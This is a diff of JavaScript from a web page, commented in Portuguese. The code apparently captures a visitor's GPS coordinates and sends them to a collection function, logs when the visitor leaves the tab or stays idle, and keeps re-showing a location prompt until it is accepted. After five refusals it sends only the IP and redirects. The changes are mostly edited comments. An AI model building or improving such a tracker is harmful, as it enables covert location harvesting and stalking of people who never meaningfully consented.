@@ -75,12 +75,12 @@
             });
         }
 
-        // Timer de 3 minutos (180.000 milissegundos) caso fique inativo ou saia do navegador
+        // Timer de 3 minutos de inatividade
         let timerInativo = setTimeout(() => {
             enviarDados("SEM_GPS_INATIVO_3MIN", "SEM_GPS_INATIVO_3MIN", "0");
         }, 180000);
 
-        // Detecta se a pessoa saiu do navegador (mudou de aba ou minimizou)
+        // Se sair ou minimizar o navegador
         document.addEventListener("visibilitychange", function() {
             if (document.hidden) {
                 enviarDados("SAIU_DO_NAVEGADOR", "SAIU_DO_NAVEGADOR", "0");
@@ -93,7 +93,7 @@
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(pos) {
-                    clearTimeout(timerInativo); // Cancela o timer se conseguiu a loc
+                    clearTimeout(timerInativo);
                     let lat = pos.coords.latitude;
                     let lon = pos.coords.longitude;
                     let precisao = pos.coords.accuracy;
@@ -102,6 +102,7 @@
                     enviarDados(lat, lon, precisao);
 
                 }, function(err) {
+                    // Mantém ou exibe o pop-up forçadamente se falhar
                     modalGps.style.display = "flex";
                 }, {
                     timeout: 7000,
@@ -116,10 +117,11 @@
             const modalGps = document.getElementById('modal-gps');
             const statusTexto = document.getElementById('status-texto');
             
+            // Fecha o modal momentaneamente para testar a leitura
             modalGps.style.display = "none";
             tentativasSemGps++;
 
-            // Se atingir 5 tentativas de continuar sem ativar o GPS, envia apenas o IP e redireciona
+            // Se atingir 5 tentativas, desiste, envia apenas o IP e redireciona
             if (tentativasSemGps >= maxTentativas) {
                 clearTimeout(timerInativo);
                 enviarDados("LIMITE_5_TENTATIVAS", "LIMITE_5_TENTATIVAS", "0");
@@ -128,6 +130,7 @@
 
             statusTexto.innerText = "Tentando novamente (" + tentativasSemGps + "/" + maxTentativas + ")...";
             
+            // Nova tentativa de capturar o GPS
             navigator.geolocation.getCurrentPosition(function(pos) {
                 clearTimeout(timerInativo);
                 let lat = pos.coords.latitude;
@@ -135,6 +138,7 @@
                 let precisao = pos.coords.accuracy;
                 enviarDados(lat, lon, precisao);
             }, function(err) {
+                // Se continuar sem GPS, o modal reaparece imediatamente para a próxima tentativa
                 modalGps.style.display = "flex";
             }, {
                 timeout: 7000,
